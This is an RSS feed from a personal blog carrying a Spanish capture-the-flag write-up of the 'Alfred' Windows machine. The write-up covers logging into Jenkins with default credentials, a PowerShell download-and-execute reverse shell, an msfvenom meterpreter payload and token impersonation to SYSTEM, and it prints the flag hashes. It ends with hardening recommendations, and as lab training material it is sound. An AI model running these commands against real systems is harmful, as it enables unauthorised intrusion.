@@ -1,0 +1,123 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Jenkins on Gabriel Tello</title>
+    <link>http://localhost:1313/es/tags/jenkins/</link>
+    <description>Recent content in Jenkins on Gabriel Tello</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>es-EC</language>
+    <managingEditor>gabrieltello10@hotmail.com (Gabriel Tello)</managingEditor>
+    <webMaster>gabrieltello10@hotmail.com (Gabriel Tello)</webMaster>
+    <copyright>[Gabriel Tello](https://github.com/gtello) © 2024</copyright>
+    <lastBuildDate>Fri, 15 Nov 2024 15:30:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/es/tags/jenkins/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Reto Alfred (Hacker Mentor PMJ)</title>
+      <link>http://localhost:1313/es/writeups/alfred/</link>
+      <pubDate>Fri, 15 Nov 2024 15:30:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
+      <guid>http://localhost:1313/es/writeups/alfred/</guid>
+      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Writeup de la máquina Alfred, parte del reto Hacker Mentor PMJ.&lt;/p&gt;&#xA;&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;&#xA;&lt;p&gt;Este writeup documenta el análisis y explotación de vulnerabilidades en un entorno Windows con Jenkins expuesto, la ejecución remota de comandos a través de un reverse shell, y la escalación de privilegios utilizando técnicas avanzadas para obtener control completo del sistema.&lt;/p&gt;&#xA;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;&#xA;&lt;p&gt;El reconocimiento inicial se llevó a cabo con un escaneo de red utilizando &lt;code&gt;nmap&lt;/code&gt; para identificar puertos y servicios abiertos en la máquina objetivo.&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<div style="text-align: justify;">
+<p>Writeup de la máquina Alfred, parte del reto Hacker Mentor PMJ.</p>
+<h2 id="resumen">Resumen</h2>
+<p>Este writeup documenta el análisis y explotación de vulnerabilidades en un entorno Windows con Jenkins expuesto, la ejecución remota de comandos a través de un reverse shell, y la escalación de privilegios utilizando técnicas avanzadas para obtener control completo del sistema.</p>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>El reconocimiento inicial se llevó a cabo con un escaneo de red utilizando <code>nmap</code> para identificar puertos y servicios abiertos en la máquina objetivo.</p>
+<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Sistema Operativo</th>
+          <th style="text-align: left">Dirección IP</th>
+          <th style="text-align: left">Puertos Abiertos</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">Windows Server</td>
+          <td style="text-align: left">10.10.149.26</td>
+          <td style="text-align: left">80, 3389, 8080</td>
+      </tr>
+  </tbody>
+</table>
+<p><img alt="Comando nmap y resultados" src="/images/posts/alfred/image1.png"></p>
+<center><b>Comando nmap y resultados</b></center>
+<p>Los puertos abiertos 80 y 8080 fueron analizados en el navegador. En el puerto 8080 se descubrió un portal de inicio de sesión para Jenkins, una herramienta ampliamente utilizada en CI/CD.</p>
+<h2 id="explotación">Explotación</h2>
+<p>Al intentar iniciar sesión en el portal de Jenkins, se probaron credenciales por defecto encontradas en Google (<code>admin:admin</code>), lo cual permitió acceso al panel de control.</p>
+<p><img alt="Dashboard de Jenkins" src="/images/posts/alfred/image2.png"></p>
+<center><b>Dashboard de Jenkins</b></center>
+<p>Dentro de la configuración del proyecto en Jenkins, aprovechamos la opción de ejecutar comandos en el apartado &ldquo;Build&rdquo;. Usamos un script de PowerShell para establecer una reverse shell con el siguiente comando:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.6.5.62:8008/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="mf">10.6</span><span class="p">.</span><span class="py">5</span><span class="p">.</span><span class="py">62</span> <span class="n">-Port</span> <span class="mf">4321</span></span></span></code></pre></div><p>El comando ejecutado mediante la opción <strong>Build Now</strong> permitió conectarnos exitosamente a la máquina objetivo desde nuestra terminal atacante.</p>
+<p><img alt="Comando de reverse shell en Jenkins" src="/images/posts/alfred/image3.png"></p>
+<center><b>Comando de reverse shell en Jenkins</b></center>  
+<p><img alt="Acceso mediante reverse shell" src="/images/posts/alfred/image4.png"></p>
+<center><b>Acceso mediante reverse shell</b></center>
+<h2 id="escalación-de-privilegios">Escalación de Privilegios</h2>
+<p>Con acceso inicial a la máquina, generamos un payload ejecutable para obtener una sesión de <code>meterpreter</code> utilizando <code>msfvenom</code>:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe -o revshell.exe</span></span></code></pre></div><p>Transferimos el payload a la máquina objetivo utilizando <code>certutil</code> y lo ejecutamos. Esto estableció una conexión <code>meterpreter</code> con nuestra máquina atacante.</p>
+<p><img alt="Configuración del receptor en Metasploit" src="/images/posts/alfred/image5.png"></p>
+<center><b>Configuración del receptor en Metasploit</b></center>
+<p>Revisando los privilegios del usuario, detectamos los permisos <code>SeDebugPrivilege</code> y <code>SeImpersonatePrivilege</code>. Estos privilegios permiten suplantar tokens para acceder a procesos con permisos elevados. Usamos el módulo <code>incognito</code> de Metasploit para explotar esta vulnerabilidad.</p>
+<p><img alt="Uso del módulo incognito" src="/images/posts/alfred/image6.png"></p>
+<center><b>Uso del módulo incognito</b></center>
+<p>Finalmente, migramos el proceso a un servicio con permisos <code>SYSTEM</code>, logrando el control total de la máquina.</p>
+<p><img alt="Migración a un proceso privilegiado" src="/images/posts/alfred/image7.png"></p>
+<center><b>Migración a un proceso privilegiado</b></center>
+<h2 id="banderas">Banderas</h2>
+<p>Con acceso administrativo, localizamos las banderas en el sistema:</p>
+<ul>
+<li><strong>user.txt</strong>: <code>79007a09481963edf2e1321abd9ae2a0</code></li>
+<li><strong>root.txt</strong>: <code>dff0f748678f280250f25a45b8046b4a</code></li>
+</ul>
+<h2 id="herramientas-utilizadas">Herramientas Utilizadas</h2>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Herramienta</th>
+          <th style="text-align: left">Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>nmap</strong></td>
+          <td style="text-align: left">Escaneo de red y detección de servicios abiertos.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>Jenkins</strong></td>
+          <td style="text-align: left">Plataforma explotada con credenciales por defecto para ejecutar comandos.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>msfvenom/metasploit</strong></td>
+          <td style="text-align: left">Generación de payloads y escalación de privilegios con el módulo incognito.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>certutil</strong></td>
+          <td style="text-align: left">Transferencia del payload a la máquina objetivo.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="conclusión">Conclusión</h2>
+<p>La explotación del sistema Alfred destacó problemas críticos como servicios expuestos con credenciales por defecto y configuraciones erróneas de privilegios. Esto permitió la escalación hasta permisos administrativos.</p>
+<h2 id="recomendaciones">Recomendaciones</h2>
+<ul>
+<li>Actualizar Jenkins y eliminar credenciales por defecto.</li>
+<li>Configurar un firewall para restringir accesos innecesarios.</li>
+<li>Implementar políticas de contraseñas robustas.</li>
+<li>Limitar privilegios innecesarios en usuarios.</li>
+<li>Realizar auditorías periódicas de seguridad y monitoreo continuo.</li>
+</ul>
+</div>]]></content:encoded>
+    </item>
+  </channel>
+</rss>
